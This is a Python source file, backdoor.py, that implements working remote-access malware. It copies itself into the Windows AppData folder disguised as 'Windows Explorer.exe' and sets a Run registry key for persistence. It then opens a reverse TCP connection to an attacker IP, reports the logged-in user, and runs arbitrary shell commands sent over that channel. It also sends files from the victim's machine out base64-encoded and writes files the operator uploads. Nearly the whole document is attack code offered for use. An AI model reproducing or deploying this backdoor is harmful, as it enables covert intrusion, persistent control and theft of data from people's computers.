#! usr/bin/env python3

"""
* Author:               Job Jacob
* Created:              24 December 2020 
* Filename:             backdoor.py
* Example Run (Linux):  python3 backdoor.py
"""

import os
import sys
import shutil
import platform
import json
import socket
import base64 
import subprocess

""" 
* Function Name:  execute_on_startup()
* Input:          None
* Output:         None
* Logic:          The function is used to make the executable file to run in the background of the compromised system on start up.
* Example Call:   execute_on_startup()
"""
def execute_on_startup():
    try:
        if(platform.system() == "Windows"):
            backdoor_loc = os.environ["appdata"] + "\\Windows Explorer.exe"
            if(not os.path.exists(backdoor_loc)):
                shutil.copyfile(sys.executable, backdoor_loc)
                sys_command = 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_loc + '"'
                result = execute_system_command(sys_command)
    
    except:
        pass

""" 
* Function Name:  establish_connection()
* Input:          ip (string): The IP address of the attacker system.
*                 port (integer): The port through which the connection should be established.
* Output:         connection (socket object): The socket object after connection establishment.
* Logic:          The function is used to create a TCP connection from the compromised system to the attacker system.
* Example Call:   connection = establish_connection("192.168.1.11", 2000)
"""
def establish_connection(ip, port):
    while True:
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((ip, port))
            break

        except:
            continue

    user = execute_system_command("whoami")
    success_message = "User: {}".format(user)
    send_data(connection, success_message)

    return connection

""" 
* Function Name:  receive_data()
* Input:          connection (socket object): The socket object of the connection.
* Output:         data (string): The command / data received from the attacker that should be executed / uploaded in the compromised system.
* Logic:          The function is used to receive data from the attacker in a serialized manner.
* Example Call:   receive_data(connection)
"""
def receive_data(connection):
    data = ""

    while True:
        try:
            data += connection.recv(1024).decode('utf-8')
            return json.loads(data)

        except ValueError:
            continue

""" 
* Function Name:  send_data()
* Input:          connection (socket object): The socket object of the connection.
*                 data (string): The output of the command after execution / data from the compromised system.
* Output:         None
* Logic:          The function is used to send data to the attacker in a serialized manner.
* Example Call:   send_data(connection, "test.txt ...")
"""
def send_data(connection, data):
    data = json.dumps(data)
    connection.send(data.encode('utf-8'))

""" 
* Function Name:  execute_system_command()
* Input:          command (string): The command received from the attacker to execute in the compromised system.               
* Output:         result (string): The output of the command after execution.
* Logic:          The function is used to execute commands received from the attacker on the compromised system.
* Example Call:   execute_system_command("ls")
"""
def execute_system_command(command):
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
    
    except:
        return "INVALID command."

""" 
* Function Name:  change_working_directory()
* Input:          path (string): The path to which the present working directory should be changed to.             
* Output:         chdir_msg (string): Message to be send to atttacker informing him that the directory has been changed successfully.
* Logic:          The function is used to change the present working directory.
* Example Call:   result = change_working_directory("cd ..")
"""
def change_working_directory(path):
    try:
        os.chdir(path)
        return "Working directory changed to {}".format(os.getcwd())

    except:
        return "Invalid PATH."

""" 
* Function Name:  read_file()
* Input:          path (string): Path to the file to download from the compromised system.            
* Output:         data (string): base64 encoded content of the file.
* Logic:          The function is used to read the contents of a file in base64 format inorder to send it to the attacker.
* Example Call:   data = read_file("test.txt")
"""
def read_file(path):
    try:
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode('utf-8')

    except FileNotFoundError:
        return "Error: File does not exist. Please verify the path again."

""" 
* Function Name:  write_file()
* Input:          path (string): Path to where the file should be written to in the compromised system.
*                 data (string): Data to be written to the file.
* Output:         result (string): Message telling whether the writing of file was successful or unsuccessful.
* Logic:          The function is used to decode and write the base64 encoded data onto a file in the compromised system. 
* Example Call:   result = write_file("./", "sGetxalWFa...")
"""
def write_file(path, data):
    try:
        with open(path, "wb") as file:
            file.write(base64.b64decode(data))

        return "File uploaded SUCCESSFULLY."

    except:
        if(path[-1] == "/"):
            return "Invalid Destination PATH. Please add the file name along with the destination PATH."
        else:
            return "Invalid Destination PATH. Please verify the destination path and try again."

""" 
* Function Name:  communicate()
* Input:          connection (socket object): The socket object of the connection.
* Output:         None
* Logic:          The function is used to tranfer data / commands between the compromised system and the attacker. 
* Example Call:   communicate(connection)
"""
def communicate(connection):
    while True:
        try:
            command = receive_data(connection)

            if(command[0] == "quit"):
                break

            elif((command[0] == "cd") and (len(command) > 1)):
                result = change_working_directory(" ".join(command[1::]))
                send_data(connection, result)

            elif(command[0] == "download"):
                file_data = read_file(command[1])
                send_data(connection, file_data)

            elif(command[0] == "upload"):
                path = command[2] if(len(command) > 3) else command[1]
                data = command[3] if(len(command) > 3) else command[2]
                result = write_file(path, data)
                send_data(connection, result)

            else:
                result = execute_system_command(command)
                send_data(connection, result)

        except:
            result = "Some unknown error occurred. Please verify your input."
            send_data(connection, result)
            continue

    connection.close()


if __name__ == "__main__":
    ATTACKER_IP = "192.168.1.11"
    PORT = 2000
    
    try:
        execute_on_startup()
        connection = establish_connection(ATTACKER_IP, PORT)
        communicate(connection)

    except:
        pass